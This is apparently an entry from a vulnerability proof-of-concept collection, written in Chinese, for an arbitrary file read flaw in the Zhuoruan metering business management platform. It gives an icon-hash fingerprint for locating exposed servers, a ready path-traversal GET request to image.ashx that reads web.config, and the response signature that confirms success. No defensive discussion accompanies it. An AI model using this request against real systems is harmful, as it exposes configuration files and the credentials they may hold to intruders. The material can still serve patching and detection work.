# 卓软计量业务管理平台image存在任意文件读取漏洞

卓软计量业务管理平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`icon_hash="-334571363`
- **请求**：`GET /HuameiMeasure/image.ashx?image_path=./../web.config HTTP/1.1`
- **响应特征**：200 <?xml version=”1.0” encoding=”utf-8” ?>s